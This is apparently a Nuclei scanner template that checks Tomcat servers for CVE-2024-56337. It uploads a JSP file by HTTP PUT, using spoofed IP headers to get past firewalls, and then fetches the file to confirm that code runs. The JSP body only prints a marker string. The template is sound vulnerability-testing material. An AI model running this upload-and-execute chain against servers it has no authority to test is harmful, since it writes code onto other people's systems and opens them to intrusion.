id: cve-2024-56337

info:
  name: "CVE-2024-56337 - Advanced RCE via Write-Enabled Default Servlet"
  author: "Abdur Rahman Jamil Chowdhury"
  severity: critical
  description: "Bypassing security patches for CVE-2024-50379, allowing arbitrary file upload via write-enabled Default Servlet leading to RCE."
  tags: cve, rce, tomcat, servlet, file-upload, firewall-bypass
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-56337

variables:
  random_file: "{{randstr}}.jsp"
  encoded_payload: "{{base64('Vulnerable')}}"

requests:
  - raw:
      - |
        PUT /{{random_file}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream
        X-Forwarded-For: 127.0.0.1, 8.8.8.8
        X-Real-IP: 127.0.0.1
        Content-Length: 80

        <% out.print(new String(java.util.Base64.getDecoder().decode("{{encoded_payload}}"))); %>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 204

  - raw:
      - |
        GET /{{random_file}} HTTP/1.1
        Host: {{Hostname}}
        X-Originating-IP: 127.0.0.1
        X-Forwarded-For: 8.8.4.4
        Referer: http://127.0.0.1

    matchers:
      - type: word
        words:
          - "Vulnerable"
